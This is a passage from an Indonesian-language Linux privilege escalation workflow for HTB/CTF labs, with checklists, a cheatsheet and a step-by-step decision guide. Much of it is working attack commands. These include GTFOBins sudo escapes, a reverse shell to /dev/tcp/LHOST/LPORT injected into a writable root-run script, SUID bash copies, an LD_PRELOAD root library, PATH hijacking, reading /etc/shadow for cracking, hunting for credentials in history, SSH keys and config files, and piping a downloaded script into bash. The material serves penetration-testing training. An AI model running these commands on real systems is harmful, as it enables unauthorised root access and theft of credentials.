|`getcap` tidak tersedia|`libcap` utilities tidak ada|Cek file capability via tools lain / transfer binary jika lab mengizinkan|
|NFS mount gagal|`rpcbind`, NFS version, network issue|Cek exports dan RPC|
|`mount.nfs: access denied`|Export restriction|Cek `/etc/exports`|
|`LD_PRELOAD` tidak bekerja|sudo/env sanitization|Verifikasi environment dan sudo policy|
|`python3` capability tidak bekerja|Capability salah / interpreter berbeda|Re-check `getcap` dan exact binary|
|Kernel exploit crash|PoC tidak cocok|Stop; verifikasi versi/distro dulu|
|Docker `permission denied`|Tidak punya akses daemon|Cek socket/group|
|LXD command gagal|Tidak ada daemon/image/config|Enumerate LXD environment|
|`bash -p` tidak memberikan root|Tidak ada effective UID 0|SUID/capability belum benar|
|`chroot` gagal|Privilege/filesystem/container limitation|Validasi capability dan filesystem|

---

# ✅ BAGIAN 15 — CHECKLIST LINUX PRIVESC

```text
╔══════════════════════════════════════════════╗
║     LINUX PRIVESC MASTER CHECKLIST          ║
╚══════════════════════════════════════════════╝
```

## 🤖 AUTOMATED

```text
[ ] LinPEAS dijalankan
[ ] LinPEAS output disimpan
[ ] LinPEAS output DIBACA, bukan hanya dijalankan
[ ] LSE dijalankan jika diperlukan
[ ] LinEnum dijalankan jika membutuhkan second opinion
[ ] pspy dijalankan 2–3 menit atau lebih
[ ] Linux Exploit Suggester dijalankan
```

---

## 🛡️ SUDO

```text
[ ] sudo -l
[ ] NOPASSWD dicek
[ ] Binary di sudo list dicek
[ ] GTFOBins diperiksa
[ ] Wildcard diperiksa
[ ] Script yang diizinkan diperiksa
[ ] Environment handling diperiksa
[ ] LD_PRELOAD / env_keep diperiksa bila relevan
```

---

## 🔥 SUID / SGID

```text
[ ] find / -perm -4000 dijalankan
[ ] SGID diperiksa
[ ] Binary non-standard dicatat
[ ] GTFOBins dicek
[ ] Custom binary diperiksa
[ ] strings dijalankan
[ ] ltrace dicoba
[ ] strace dicoba
[ ] PATH hijacking diperiksa
```

---

## 🧩 CAPABILITIES

```text
[ ] getcap -r / dijalankan
[ ] cap_setuid dicek
[ ] cap_setgid dicek
[ ] cap_dac_override dicek
[ ] cap_dac_read_search dicek
[ ] cap_sys_admin dicek
[ ] cap_sys_ptrace dicek
```

---

## ⏰ CRON

```text
[ ] crontab -l
[ ] /etc/crontab
[ ] /etc/cron.d
[ ] cron.daily
[ ] cron.hourly
[ ] cron.weekly
[ ] cron.monthly
[ ] systemd timers
[ ] pspy
[ ] root cron
[ ] writable script
[ ] writable imported module
[ ] PATH injection
[ ] wildcard injection
```

---

## 🔐 CREDENTIALS

```text
[ ] .bash_history
[ ] .zsh_history
[ ] .netrc
[ ] SSH private key
[ ] authorized_keys
[ ] .env
[ ] config.php
[ ] wp-config.php
[ ] database.yml
[ ] application configs
[ ] Git repositories
[ ] password strings
[ ] token/API key strings
[ ] /etc/shadow
```

---

## 👥 GROUPS

```text
[ ] docker
[ ] lxd/lxc
[ ] disk
[ ] adm
[ ] sudo
[ ] interesting custom groups
```

---

## 🌐 NETWORK

```text
[ ] ip a
[ ] ip route
[ ] ip neigh
[ ] ss -lntup
[ ] localhost-only ports
[ ] /etc/hosts
[ ] /etc/resolv.conf
[ ] internal services
```

---

## 📂 WRITABLE

```text
[ ] /etc/passwd
[ ] sudo-related files
[ ] cron scripts
[ ] systemd units
[ ] service files
[ ] PATH directories
[ ] library directories
[ ] application source
[ ] imported Python modules
[ ] binaries/scripts executed as root
```

---

## 🧨 KERNEL

```text
[ ] uname -r
[ ] uname -a
[ ] /etc/os-release
[ ] architecture
[ ] package/kernel patches
[ ] Linux Exploit Suggester
[ ] CVE verified
[ ] distro verified
[ ] PoC reviewed
[ ] exploit compatibility verified
```

---

# 📝 BAGIAN 16 — QUICK REFERENCE CHEATSHEET

## Setup

```bash
# Attacker configuration
export LHOST="10.10.14.X"
export LPORT="4444"
export TARGET="10.10.10.X"
```

---

## Shell

```bash
# Upgrade shell ke PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Setelah Ctrl+Z pada attacker:
stty raw -echo
fg

# Kembali ke target
export TERM=xterm-256color
stty rows 38 columns 116
```

---

## Transfer

Attacker:

```bash
# HTTP server
python3 -m http.server 8080
```

Target:

```bash
# Download
wget http://$LHOST:8080/linpeas.sh -O /tmp/linpeas.sh

# Execute permission
chmod +x /tmp/linpeas.sh

# Run
/tmp/linpeas.sh | tee /tmp/linpeas.out
```

---

## Triage

```bash
# Current user
id

# Current username
whoami

# Sudo
sudo -l

# Groups
groups

# SUID
find / -perm -4000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron
cat /etc/crontab

# Cron directories
ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly 2>/dev/null

# Processes
ps aux

# Listening services
ss -lntup

# Kernel
uname -a

# Distro
cat /etc/os-release
```

---

## Credential hunting

```bash
# History
cat ~/.bash_history 2>/dev/null

# SSH keys
find /home -path "*/.ssh/id_*" -type f 2>/dev/null

# Environment
env | grep -iE "pass|pwd|secret|token|key"

# Web configs
find /var/www -type f \
  \( -name ".env" -o -name "config.php" -o -name "wp-config.php" \) \
  2>/dev/null
```

---

## Root shell verification

```bash
# Jangan hanya melihat shell prompt
id

# Expected root identity
whoami

# Check EUID
id -u
```

Expected:

```text
0
```

---

## Root flag

```bash
# HTB/CTF common location
cat /root/root.txt
```

---

# 🔗 BAGIAN 17 — CROSS-WORKFLOW

Linux PrivEsc tidak berdiri sendiri.

## ← File 43 — Domain Persistence

Jika Linux host:

```text
joined to Active Directory
```

maka credential discovery dapat menjadi sangat penting:

```text
Linux credential
    ↓
AD credential
    ↓
Kerberos / LDAP / SMB
    ↓
lateral movement
```

---

## ← File 06 — SSH Workflow

Jika menemukan:

```text
SSH private key
```

maka hubungkan dengan SSH workflow:

```text
Private Key
    ↓
Permission validation
    ↓
Identify user
    ↓
SSH login
    ↓
sudo -l
    ↓
PrivEsc
```

---

## → File 45 — Windows Privilege Escalation

Setelah Linux PrivEsc:

```text
same methodology
different operating system
```

Prinsip yang tetap sama:

```text
Enumerate
Identify trust boundary
Find weak configuration
Validate
Exploit
Verify
```

---

## → File 47 — Sudo, SUID & Capabilities Deep Dive

Gunakan workflow berikut sebagai:

```text
Broad PrivEsc workflow
```

Sedangkan File 47:

```text
Deep-dive workflow
```

untuk:

```text
sudo
SUID
SGID
capabilities
GTFOBins
custom binaries
```

---

## → File 64 — Pivoting & Tunneling

Jika PrivEsc enumeration menemukan:

```text
127.0.0.1:8080
127.0.0.1:3306
10.10.20.0/24
internal hostname
```

maka pivoting/tunneling dapat menjadi langkah berikutnya.

Contoh workflow:

```text
Privilege Escalation
       ↓
Network enumeration
       ↓
Internal network discovered
       ↓
Pivoting
       ↓
Internal service enumeration
       ↓
Further exploitation
```

---

# 🧠 MASTER MENTAL MODEL

Jangan menghafal:

```text
50 exploit command
```

Hafalkan pertanyaan:

```text
1. Siapa saya?
2. Saya punya group apa?
3. Saya bisa sudo apa?
4. Ada SUID apa?
5. Ada capability apa?
6. Root menjalankan apa?
7. Apa yang bisa saya tulis?
8. Apa yang bisa saya baca?
9. Ada credential?
10. Ada service internal?
11. Ada Docker/LXD/NFS?
12. Apakah PATH dapat saya kontrol?
13. Apakah library dapat saya kontrol?
14. Apakah kernel benar-benar vulnerable?
```

---

# 🏆 FINAL PRIVESC WORKFLOW

```text
                 LOW PRIV SHELL
                       │
                       ▼
               ┌───────────────┐
               │ STABILIZE TTY │
               └───────┬───────┘
                       │
                       ▼
                 ┌───────────┐
                 │   id      │
                 │ sudo -l   │
                 │ groups    │
                 └─────┬─────┘
                       │
                       ▼
                 ┌───────────┐
                 │ LINPEAS   │
                 └─────┬─────┘
                       │
           ┌───────────┴────────────┐
           │                        │
           ▼                        ▼
      FINDING                 NO OBVIOUS FINDING
           │                        │
           ▼                        ▼
      VALIDATE                MANUAL ENUM
           │                        │
           ├───────────────┬────────┼─────────────┐
           │               │        │             │
           ▼               ▼        ▼             ▼
         SUDO             SUID     CAPS          CRON
           │               │        │             │
           ▼               ▼        ▼             ▼
       GTFOBins         Custom    setuid       Writable?
           │             binary      │             │
           │               │         │             ▼
           │               ▼         │          PATH?
           │              PATH       │             │
           └───────────────┴─────────┴─────────────┘
                                   │
                                   ▼
                              CREDENTIALS
                                   │
                          ┌────────┴────────┐
                          │                 │
                          ▼                 ▼
                         REUSE            SSH
                          │                 │
                          └────────┬────────┘
                                   │
                                   ▼
                             SPECIAL GROUPS
                                   │
                  ┌────────────────┼────────────────┐
                  │                │                │
                  ▼                ▼                ▼
               docker             lxd             disk
                  │                │                │
                  └────────────────┼────────────────┘
                                   │
                                   ▼
                                 NFS
                                   │
                                   ▼
                         PATH / LIBRARY HIJACK
                                   │
                                   ▼
                            KERNEL — LAST
                                   │
                                   ▼
                              ROOT SHELL
                                   │
                                   ▼
                            VERIFY UID 0
                                   │
                                   ▼
                            CAPTURE ROOT FLAG
                                   │
                                   ▼
                               CLEANUP
```

---

# 🎯 GOLDEN RULES

```text
RULE #1
Enumerate before exploiting.

RULE #2
sudo -l is one of the first commands.

RULE #3
id/groups can reveal privilege paths immediately.

RULE #4
SUID ≠ automatically vulnerable.

RULE #5
Capability ≠ automatically root.

RULE #6
Red LinPEAS ≠ guaranteed exploit.

RULE #7
Cron must be analyzed as:
WHO → WHAT → WHEN → HOW → CAN I CONTROL IT?

RULE #8
Credential reuse is often cleaner than kernel exploitation.

RULE #9
Kernel exploit = last resort.

RULE #10
Always verify with:
id
whoami
id -u

RULE #11
Understand the primitive:
read
write
execute
impersonate
load
inherit
delegate

RULE #12
Do not memorize exploits blindly.
Understand WHY they work.
```

---

# 🧩 PRIVESC PRIMITIVES

Hampir semua Linux PrivEsc akhirnya dapat dipetakan ke primitive berikut:

```text
READ
│
├── /etc/shadow
├── config
├── SSH key
└── secret

WRITE
│
├── cron
├── /etc/passwd
├── service
├── script
└── library

EXECUTE
│
├── sudo
├── SUID
├── capabilities
└── service

IMPERSONATE
│
├── setuid
├── sudo
└── privileged process

LOAD
│
├── LD_PRELOAD
├── shared library
└── Python module

INHERIT
│
├── Docker
├── LXD
├── NFS
└── privileged process

DELEGATE
│
├── sudo
├── file permissions
└── service execution
```

---

# 🚦 FINAL STOP/GO CHECK

Sebelum menjalankan exploit, tanyakan:

```text
[ ] Saya tahu siapa yang menjalankan target process?
[ ] Saya tahu privilege process tersebut?
[ ] Saya tahu apa yang dikontrol attacker?
[ ] Saya tahu kenapa primitive tersebut menyebabkan escalation?
[ ] Saya tahu command yang saya jalankan?
[ ] Saya tahu file/process yang akan dimodifikasi?
[ ] Saya bisa menjelaskan exploit tersebut dengan kata-kata saya sendiri?
```

Jika jawabannya:

```text
YES
```

baru:

```text
EXPLOIT
```

Jika:

```text
NO
```

kembali ke:

```text
ENUMERATION
```

---

# 🏁 END STATE

Linux PrivEsc selesai bukan ketika:

```text
"Payload kelihatannya berhasil."
```

Tetapi ketika:

```bash
# Verifikasi identity
id

# Verifikasi username
whoami

# Verifikasi numeric UID
id -u
```

dan output menunjukkan:

```text
uid=0(root)
```

Kemudian pada CTF:

```bash
# Ambil root flag
cat /root/root.txt
```

---

# 📌 ONE-LINE MEMORY

```text
SHELL → STABILIZE → ENUMERATE → sudo → SUID → CAPS → CRON → CREDS → WRITABLE → SERVICES → DOCKER/LXD/NFS → PATH/LIBRARY → KERNEL → ROOT
```

# 🧠 THE REAL SKILL

> **Linux Privilege Escalation bukan kemampuan menghafal exploit.**
> 
> Kemampuan sebenarnya adalah melihat sistem dan menemukan:
> 
> **"Apa yang dipercaya sebagai root tetapi masih dapat saya kontrol?"**

Itulah pertanyaan utama yang harus muncul setiap kali mendapatkan low-privilege shell.

---

# [🐧 44 — Linux Privilege Escalation Workflow](/docs/linux-privesc) — Complete Interactive Decision Guide

> **Cara baca:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"        # IP tun0 kamu
export LPORT="4444"
mkdir -p ~/privesc_loot/{creds,keys,output,loot}
cd ~/privesc_loot

echo "[*] Target: $TARGET | LHOST: $LHOST | LPORT: $LPORT"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | LHOST: 10.10.14.5 | LPORT: 4444
```

---

## ═══════════════════════════════════════

## FASE 0: MASUK DAN STABILISASI SHELL

## ═══════════════════════════════════════

> **Konteks:** Kamu sudah dapat shell awal (dari exploit web, RCE, SMB, dsb). Shell mentah belum bisa dipakai nyaman. Stabilisasi DULU sebelum apapun.

### Langkah 0.1 — Deteksi Jenis Shell yang Didapat

Bash

```
# Command 1: Cek apakah shell interaktif atau tidak
echo $SHELL
echo $0

# Command 2: Cek apakah ada TTY
tty
```

**OUTPUT BERHASIL ✅ — Shell sudah ada TTY:**

text

```
/dev/pts/0
```

➡️ Shell sudah stabil. Lanjut ke **Langkah 0.3**

**OUTPUT GAGAL ❌ — Shell mentah (no TTY):**

text

```
not a tty
```

➡️ Harus upgrade dulu. Lanjut ke **Langkah 0.2**

---

### Langkah 0.2 — Upgrade Shell ke PTY

Bash

```
# Method 1: Python3 (paling umum, coba ini dulu)
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Method 2: Python2 (jika python3 tidak ada)
python -c 'import pty; pty.spawn("/bin/bash")'

# Method 3: script (fallback)
script /dev/null -c bash

# Method 4: Perl
perl -e 'exec "/bin/bash";'

# Method 5: Ruby
ruby -e 'exec "/bin/bash"'
```

**OUTPUT BERHASIL ✅ — PTY spawned:**

text

```
www-data@victim:/var/www/html$
```

➡️ Sekarang upgrade terminal lokal:

Bash

```
# Di shell target — tekan Ctrl+Z dulu
# Lalu di terminal attacker:
stty raw -echo; fg

# Kemudian tekan Enter, lalu di shell target:
export TERM=xterm-256color

# Sesuaikan ukuran terminal (jalankan di attacker dulu: stty size)
stty rows 38 columns 116
```

**OUTPUT GAGAL ❌ — Python tidak tersedia:**

text

```
python3: command not found
python: command not found
```

➡️ Coba `script` atau `perl`. Jika semua gagal, lanjutkan dengan shell mentah tapi hindari `sudo` karena butuh TTY.

---

### Langkah 0.3 — Identifikasi User dan Konteks Awal

Bash

```
# WAJIB — jalankan semua ini sekaligus di awal
id
whoami
groups
echo "Home: $HOME"
echo "Shell: $SHELL"
```

**OUTPUT BERHASIL ✅ — Low privilege user:**

text

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**OUTPUT BERHASIL ✅ — User dengan group menarik:**

text

```
uid=1001(alice) gid=1001(alice) groups=1001(alice),4(adm),998(docker)
```

> **📌 PERHATIKAN GROUP BERIKUT — Ini adalah jackpot:**

|Group|Potensi Privesc|
|---|---|
|`docker`|Mount host filesystem → root|
|`lxd` / `lxc`|Privileged container → root|
|`disk`|Baca block device langsung → /etc/shadow|
|`sudo`|Cek `sudo -l` segera|
|`adm`|Baca log sensitif|

**OUTPUT BERHASIL ✅ — Langsung root:**

text

```
uid=0(root) gid=0(root) groups=0(root)
```

➡️ Sudah root! Langsung ke **Fase 7 (Post-Exploitation)**. Ambil flag: `cat /root/root.txt`

---

## ═══════════════════════════════════════

## FASE 1: SUDO CHECK — SELALU PERTAMA

## ═══════════════════════════════════════

> **Kenapa pertama?** Sudo adalah vektor paling cepat dan paling sering ditemukan di CTF.

### Langkah 1.1 — Cek Sudo Privileges

Bash

```
# Command utama — WAJIB
sudo -l

# Jika ditanya password dan kamu punya password:
sudo -l -S <<< "password_yang_kamu_punya"

# Jika tidak punya password tapi ingin lihat sudoers:
cat /etc/sudoers 2>/dev/null
cat /etc/sudoers.d/* 2>/dev/null
```

**OUTPUT BERHASIL ✅ — NOPASSWD ALL (jackpot):**

text

```
User alice may run the following commands on victim:
    (ALL : ALL) NOPASSWD: ALL
```

➡️ Eksekusi langsung:

Bash

```
sudo /bin/bash
# Verifikasi
id
```

**OUTPUT BERHASIL ✅ — NOPASSWD binary spesifik:**

text

```
(root) NOPASSWD: /usr/bin/vim
(root) NOPASSWD: /usr/bin/python3 /opt/monitor.py
(root) NOPASSWD: /usr/bin/find
```

➡️ **SIMPAN INFO INI:** `echo "sudo: vim, python3 /opt/monitor.py, find" >> ~/privesc_loot/findings.txt`  
➡️ Lanjut ke **Langkah 1.2** untuk eksploitasi.

**OUTPUT GAGAL ❌ — No sudo:**

text

```
User alice is not allowed to run sudo on victim.
```

➡️ Lanjut ke **Fase 2 (SUID)**

**OUTPUT GAGAL ❌ — Butuh password:**

text

```
[sudo] password for alice:
```

➡️ Jika punya password (dari credential hunting nanti), coba. Jika tidak, lanjut ke **Fase 2**

**OUTPUT GAGAL ❌ — sudo: no tty present:**

text

```
sudo: no tty present and no askpass program specified
```

➡️ Shell belum punya TTY. Kembali ke **Langkah 0.2** untuk upgrade shell.

---

### Langkah 1.2 — Eksploitasi Sudo Binary (GTFOBins)

> **Prinsip:** Setiap binary yang diizinkan sudo harus dicek di GTFOBins: `https://gtfobins.github.io/`

**Tabel GTFOBins Common — Sudo Context:**

|Binary|Command untuk Escape|
|---|---|
|`vim`|`sudo vim -c ':!/bin/bash'` atau dalam vim: `:shell`|
|`nano`|`sudo nano`, lalu `Ctrl+R Ctrl+X`, ketik: `reset; sh 1>&0 2>&0`|
|`less`|`sudo less /etc/passwd`, lalu ketik `!sh`|
|`more`|`sudo more /etc/passwd`, lalu ketik `!sh`|
|`man`|`sudo man ls`, lalu ketik `!sh`|
|`find`|`sudo find . -exec /bin/bash \; -quit`|
|`awk`|`sudo awk 'BEGIN {system("/bin/bash")}'`|
|`python3`|`sudo python3 -c 'import os; os.system("/bin/bash")'`|
|`perl`|`sudo perl -e 'exec "/bin/bash"'`|
|`ruby`|`sudo ruby -e 'exec "/bin/bash"'`|
|`env`|`sudo env /bin/bash`|
|`bash`|`sudo bash -p`|
|`nmap`|`sudo nmap --interactive` → `!sh` (versi lama)|
|`tar`|`sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash`|
|`zip`|`sudo zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"`|
|`cp`|Buat sshd config berbahaya|
|`tee`|Write ke file privileged|
|`base64`|Baca file privileged|
|`cat`|Baca /etc/shadow|

**KASUS KHUSUS — Script yang diizinkan sudo:**

Bash

```
# Misal: (root) NOPASSWD: /usr/bin/python3 /opt/monitor.py
# PERHATIAN: Ini hanya izinkan script SPESIFIK itu, bukan semua python3

# Cek apakah script writable
ls -la /opt/monitor.py
stat /opt/monitor.py

# Lihat isi script
cat /opt/monitor.py

# Cek apakah script import module yang bisa kita kontrol
head -20 /opt/monitor.py
```

**OUTPUT BERHASIL ✅ — Script writable:**

text

```
-rwxrwxrwx 1 root root 156 Jan 15 /opt/monitor.py
```

➡️ Inject payload:

Bash

```
# Backup dulu
cp /opt/monitor.py /tmp/monitor.py.bak

# Inject reverse shell
echo 'import os; os.system("bash -c '"'"'bash -i >& /dev/tcp/LHOST/LPORT 0>&1'"'"'")' >> /opt/monitor.py

# Setup listener di attacker dulu
# nc -lvnp 4444

# Jalankan
sudo /usr/bin/python3 /opt/monitor.py
```

**OUTPUT BERHASIL ✅ — Script punya import yang writable:**

Python

```
import utils       # ← cek apakah utils.py bisa kita tulis
import backup_lib  # ← cek apakah backup_lib.py bisa kita tulis
```

Bash

```
# Cari letak module
find / -name "utils.py" 2>/dev/null
find / -name "backup_lib.py" 2>/dev/null

# Cek permission
ls -la /usr/local/lib/python3.x/utils.py

# Jika writable, inject payload
echo 'import os; os.system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash")' > /usr/local/lib/python3.x/utils.py

sudo /usr/bin/python3 /opt/monitor.py
/tmp/rootbash -p
id
```

**OUTPUT GAGAL ❌ — Script tidak writable dan tidak ada import yang bisa dikontrol:**  
➡️ Lanjut cek apakah binary sudonya ada di GTFOBins. Jika tidak ada, lanjut ke **Fase 2**

---

### Langkah 1.3 — Sudo dengan Wildcard atau Environment

Bash

```
# Cek apakah ada env_keep atau LD_PRELOAD
sudo -l | grep -i "env\|LD_"
```

**OUTPUT BERHASIL ✅ — env_keep LD_PRELOAD:**

text

```
env_keep+=LD_PRELOAD
```

➡️ Buat malicious shared library:

Bash

```
# Buat source
cat > /tmp/preload.c << 'EOF'
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor))
void init(void) {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

# Compile
gcc -fPIC -shared -o /tmp/preload.so /tmp/preload.c

# Jalankan dengan allowed binary
sudo LD_PRELOAD=/tmp/preload.so /usr/bin/find
```

**OUTPUT BERHASIL ✅ — Root shell:**

text

```
root@victim:/# id
uid=0(root) gid=0(root)
```

---

## ═══════════════════════════════════════

## FASE 2: SUID/SGID ENUMERATION

## ═══════════════════════════════════════

### Langkah 2.1 — Cari Semua SUID Binary

Bash

```
# Command 1: SUID saja
find / -perm -4000 -type f 2>/dev/null | sort

# Command 2: SGID saja
find / -perm -2000 -type f 2>/dev/null | sort

# Command 3: SUID + SGID sekaligus dengan detail
find / \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null \
    -exec ls -la {} \; | sort

# Command 4: Yang lebih cepat dengan stat
find / -perm -4000 -type f 2>/dev/null -exec stat -c "%A %U %n" {} \;
```

**OUTPUT BERHASIL ✅ — Ada binary TIDAK STANDARD:**

text

```
-rwsr-xr-x root root /usr/bin/passwd       ← NORMAL, skip
-rwsr-xr-x root root /usr/bin/sudo         ← NORMAL, skip
-rwsr-xr-x root root /usr/bin/mount        ← NORMAL, skip
-rwsr-xr-x root root /usr/local/bin/backup ← !! TIDAK STANDARD !!
-rwsr-xr-x root root /opt/service/runner   ← !! TIDAK STANDARD !!
```

> **📌 DAFTAR SUID YANG NORMAL DAN BISA DISKIP:**  
> `/usr/bin/passwd`, `/usr/bin/sudo`, `/usr/bin/su`, `/usr/bin/mount`, `/usr/bin/umount`, `/usr/bin/newgrp`, `/usr/bin/chfn`, `/usr/bin/chsh`, `/usr/bin/gpasswd`, `/usr/sbin/pam_timestamp_check`

> **📌 DAFTAR SUID YANG MENARIK (cek GTFOBins):**  
> `vim`, `nano`, `find`, `python`, `python3`, `perl`, `ruby`, `bash`, `dash`, `sh`, `awk`, `nmap`, `less`, `more`, `man`, `env`, `cp`, `mv`, `tee`, `cat`, `base64`, `xxd`, `dd`, `screen`, `node`, `php`, `lua`, `strace`, `ltrace`, `systemctl`, `journalctl`

**OUTPUT BERHASIL ✅ — Ketemu binary di GTFOBins:**

text

```
-rwsr-xr-x root root /usr/bin/find
```

➡️ Eksploitasi:

Bash

```
# find dengan SUID
/usr/bin/find . -exec /bin/bash -p \; -quit

# Verifikasi
id
```

**Output sukses:**

text

```
bash-5.0# id
uid=1001(alice) gid=1001(alice) euid=0(root) groups=1001(alice)
```

➡️ Kamu punya euid=0! Bisa baca file root: `cat /root/root.txt`

---

### Langkah 2.2 — Analisis Custom SUID Binary

> Untuk binary non-standard yang tidak ada di GTFOBins, analisis manual diperlukan.

Bash

```
# Misal: /usr/local/bin/backup (SUID root)

# Step 1: Identifikasi tipe
file /usr/local/bin/backup

# Step 2: Cari string menarik
strings /usr/local/bin/backup

# Step 3: Jalankan dan lihat perilaku
/usr/local/bin/backup

# Step 4: Library tracing
ltrace /usr/local/bin/backup 2>&1
strace /usr/local/bin/backup 2>&1 | head -50
```

**OUTPUT strings — Yang perlu dicari:**

text

```
/bin/sh              ← calls shell!
system               ← uses system()!
exec                 ← uses exec!
service apache2      ← calls 'service' tanpa full path → PATH hijack!
/usr/bin/tar         ← calls tar → cek argument
cat /etc/shadow      ← langsung baca shadow!
```

**KASUS 1 — Binary calls command tanpa full path:**

text

```
strings output:
service apache2 start
```

➡️ **PATH Hijacking!**

Bash

```
# Buat fake 'service'
cat > /tmp/service << 'EOF'
#!/bin/bash
/bin/bash -p
EOF
chmod +x /tmp/service

# Inject PATH
export PATH=/tmp:$PATH

# Jalankan SUID binary
/usr/local/bin/backup
id
```

**KASUS 2 — Binary calls system() dengan user input:**

Bash

```
# Test command injection
/usr/local/bin/backup "test; id"
/usr/local/bin/backup "$(id)"
/usr/local/bin/backup "`id`"
```

**KASUS 3 — Binary reads library yang tidak ada:**

Bash

```
# Lihat missing libraries
ldd /usr/local/bin/backup 2>&1 | grep "not found"
```

**Output:**

text

```
libmissing.so.1 => not found
```

➡️ Library Hijacking! (Lanjut ke **Fase 5**)

**OUTPUT GAGAL ❌ — Tidak ada yang menarik:**  
➡️ Lanjut ke **Fase 3 (Capabilities)**

---

## ═══════════════════════════════════════

## FASE 3: LINUX CAPABILITIES

## ═══════════════════════════════════════

### Langkah 3.1 — Enumerate Capabilities

Bash

```
# Command utama
getcap -r / 2>/dev/null

# Alternatif jika getcap tidak ada
find / -xdev -type f 2>/dev/null | while read f; do
    cap=$(getcap "$f" 2>/dev/null)
    [ -n "$cap" ] && echo "$cap"
done
```

**OUTPUT BERHASIL ✅ — cap_setuid ditemukan:**

text

```
/usr/bin/python3.10 = cap_setuid+ep
/usr/bin/perl = cap_setuid+ep
```

➡️ Eksploitasi `cap_setuid`:

**Python3:**

Bash

```
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id
```

**Perl:**

Bash

```
perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/bash"'
id
```

**Ruby:**

Bash

```
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
id
```

**Node.js:**

Bash

```
node -e 'process.setuid(0); require("child_process").spawn("/bin/bash", {stdio: [0,1,2]})'
```

**OUTPUT BERHASIL ✅ — cap_dac_read_search:**

text

```
/usr/bin/xxd = cap_dac_read_search+ep
/usr/bin/tar = cap_dac_read_search+ep
```

➡️ Bisa baca file yang normalnya protected:

Bash

```
# Baca /etc/shadow
xxd /etc/shadow | xxd -r
# Atau
cat /etc/shadow 2>/dev/null || xxd /etc/shadow | sed 's/^.*: //' | xxd -r

# Simpan untuk di-crack
xxd /etc/shadow | xxd -r > ~/privesc_loot/shadow.txt
# → Lanjut ke hash cracking: hashcat atau john
```

**OUTPUT BERHASIL ✅ — cap_net_bind_service:**

text

```
/usr/bin/python3 = cap_net_bind_service+ep
```

➡️ Bisa bind port < 1024, berguna untuk pivoting.

**OUTPUT GAGAL ❌ — Tidak ada capability menarik:**

text

```
/usr/bin/ping = cap_net_raw+ep
```

(ping normal, skip)  
➡️ Lanjut ke **Fase 4 (Cron Jobs)**

---

## ═══════════════════════════════════════

## FASE 4: AUTOMATED ENUMERATION + CRON

## ═══════════════════════════════════════

> **Jalankan automated tools dan cron scan secara bersamaan**

### Langkah 4.1 — Transfer dan Jalankan LinPEAS

Bash

```
# Di attacker machine
cd /opt/privesc-tools  # atau di mana tools tersimpan
python3 -m http.server 8080

# Di target machine
wget http://$LHOST:8080/linpeas.sh -O /tmp/linpeas.sh
# Atau dengan curl
curl http://$LHOST:8080/linpeas.sh -o /tmp/linpeas.sh

# Set executable
chmod +x /tmp/linpeas.sh

# Jalankan dan simpan output
/tmp/linpeas.sh | tee /tmp/linpeas_output.txt 2>/dev/null

# Jika tidak bisa download (no internet):
# Jalankan langsung dari pipe
curl http://$LHOST:8080/linpeas.sh | bash
```

**OUTPUT BERHASIL ✅ — LinPEAS berjalan:**

text

```
[i] Starting linpeas...
[+] This is a SUID binary!  /usr/local/bin/backup ← RED
[+] Interesting cron job: root → /opt/cleanup.sh  ← RED
```

➡️ Setelah selesai, parse output:

Bash

```
# Cari temuan kritis (warna merah/highlight)
grep -Ei "99%|95%|highly probable|NOPASSWD|writable" /tmp/linpeas_output.txt

# Cari sudo findings
grep -i -A10 "sudo" /tmp/linpeas_output.txt | head -40

# Cari SUID
grep -i -A5 "suid" /tmp/linpeas_output.txt | head -40

# Cari credential
grep -iE "password|passwd|secret|token" /tmp/linpeas_output.txt | head -30
```

---

### Langkah 4.2 — Transfer dan Jalankan pspy (Process Monitor)

Bash

```
# Cek architecture dulu
uname -m

# Download sesuai arch (di attacker)
# x86_64: pspy64
# i386: pspy32
python3 -m http.server 8080

# Di target
wget http://$LHOST:8080/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64

# Jalankan — AMATI MINIMAL 2-3 MENIT untuk capture cron
/tmp/pspy64 -p -i 1000 | tee /tmp/pspy_output.txt

# Filter hanya proses root (UID=0)
/tmp/pspy64 | grep "UID=0" | tee /tmp/pspy_root.txt
```

**OUTPUT BERHASIL ✅ — Ketemu cron root:**

text

```
2024/01/15 10:30:01 CMD: UID=0 PID=1234 | /bin/sh -c /opt/cleanup.sh
2024/01/15 10:30:01 CMD: UID=0 PID=1235 | /bin/bash /opt/cleanup.sh
2024/01/15 10:31:01 CMD: UID=0 PID=1236 | /bin/sh -c /opt/cleanup.sh
```

➡️ Catat: `/opt/cleanup.sh` dijalankan root setiap menit!  
➡️ Lanjut ke **Langkah 4.3**

---

### Langkah 4.3 — Manual Cron Enumeration

Bash

```
# Cek semua sumber cron
crontab -l 2>/dev/null
cat /etc/crontab 2>/dev/null
cat /etc/cron.d/* 2>/dev/null
cat /etc/cron.daily/* 2>/dev/null
cat /etc/cron.hourly/* 2>/dev/null
cat /etc/cron.weekly/* 2>/dev/null
cat /etc/cron.monthly/* 2>/dev/null

# Systemd timers
systemctl list-timers --all 2>/dev/null
find /etc/systemd/system -name "*.timer" 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Cron root ditemukan:**

text

```
# /etc/crontab:
* * * * * root /opt/cleanup.sh
*/5 * * * * root /usr/bin/python3 /opt/backup.py
```

➡️ Untuk setiap script yang dijalankan root, cek:

Bash

```
# Step 1: Permission script
